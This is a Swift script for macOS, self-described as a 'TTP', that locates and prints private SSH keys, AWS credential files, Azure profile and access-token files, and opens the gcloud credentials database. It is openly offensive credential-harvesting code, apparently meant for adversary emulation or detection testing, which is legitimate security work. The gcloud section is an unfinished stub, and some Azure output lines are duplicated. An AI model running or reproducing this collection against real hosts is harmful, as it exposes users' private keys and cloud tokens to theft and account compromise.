import Foundation
import Cocoa
import SQLite3

print("This TTP will search for any files at ~/.ssh, ~/.aws, ~/.gcloud, and ~/.azure")

var nm1 = ""
var nm2 = ""

print(" ===> Attempting to check for ssh/aws/gcp/azure key files on the host...")
    var isDir = ObjCBool(true)
    let fileMan = FileManager.default
    let uName = NSUserName()
    var output = ""

    //----ssh key search
    if fileMan.fileExists(atPath: "/Users/\(uName)/.ssh",isDirectory: &isDir){
        print("==>SSH Key Info Found:")
        let enumerator = fileMan.enumerator(atPath: "/Users/\(uName)/.ssh")
        while let each = enumerator?.nextObject() as? String {
            do {
                print("\(each):")
                let fileData = "/Users/\(uName)/.ssh/\(each)"
                let fileData2 = try String(contentsOfFile: fileData)
                output = output + fileData2 + "\n"
                print(fileData2)
            } catch {
                print("[-] Error attempting to get file contents for /Users/\(uName)/.ssh/\(each)\n")
            }
        }
    } else {
        print("[-] ~/.ssh directory not found on this host")
    }

    //-------------------------

    print("")

    //----aws key search
    if fileMan.fileExists(atPath: "/Users/\(uName)/.aws",isDirectory: &isDir){
        print("==>AWS Info Found:")
        let enumerator = fileMan.enumerator(atPath: "/Users/\(uName)/.aws")
        while let each = enumerator?.nextObject() as? String {
            do {
                print("\(each):")
                let fileData = "/Users/\(uName)/.aws/\(each)"
                let fileData2 = try String(contentsOfFile: fileData)
                output = output + fileData2 + "\n"
                print(fileData2)
            } catch {
                print("[-] Error attempting to get file contents for /Users/\(uName)/.aws/\(each)\n")
            }
        }
    } else {
        print("[-] ~/.aws directory not found on this host")
    }

    print("")

    //-----gcloud creds search
    if fileMan.fileExists(atPath: "/Users/\(uName)/.config/gcloud/credentials.db") {
        do {
            print("==>GCP gcloud Info Found:")
            var db: OpaquePointer?
            let dbURL = URL(fileURLWithPath: "/Users/\(uName)/.config/gcloud/credentials.db")
            if sqlite3_open(dbURL.path, &db) != SQLITE_OK {
                print("[-] Could not open the gcloud credentials database")
                throw NSError(domain: "DatabaseError", code: 1, userInfo: nil) // You can define your own error
            } else {
                // Rest of the code
            }
        } catch {
            print("[-] Error attempting to get contents of ~/.config/gcloud/credentials.db")
        }
    } else {
        print("[-] ~/.config/gcloud/credentials.db not found on this host")
    }

print("")

    ///------------------

    //-----azure creds search
    if fileMan.fileExists(atPath: "/Users/\(uName)/.azure",isDirectory: &isDir){
        print("==>Azure Info Found:")

        let azureProfilePath = "/Users/\(uName)/.azure/azureProfile.json"
        do {
            let azureProfileContents = try String(contentsOfFile: azureProfilePath)

            print(azureProfilePath)
            output = output + azureProfilePath + "\n"
            print(azureProfileContents)
            output = output + azureProfilePath + "\n"
            print("")
        } catch {
            print("[-] Error attempting to get file contents for \(azureProfilePath)\n")
        }

        let azureTokensPath = "/Users/\(uName)/.azure/accessTokens.json"
        do {
            let azureTokensContents = try String(contentsOfFile: azureTokensPath)
            output = output + azureTokensContents
            output = output + azureTokensContents
            print(azureTokensPath)
            print(azureTokensContents)
        } catch {
            print("[-] Error attempting to get file contents for \(azureTokensPath)\n")
        }
    } else {
        print("[-] ~/.azure directory not found on this host")
    }

    print(output)
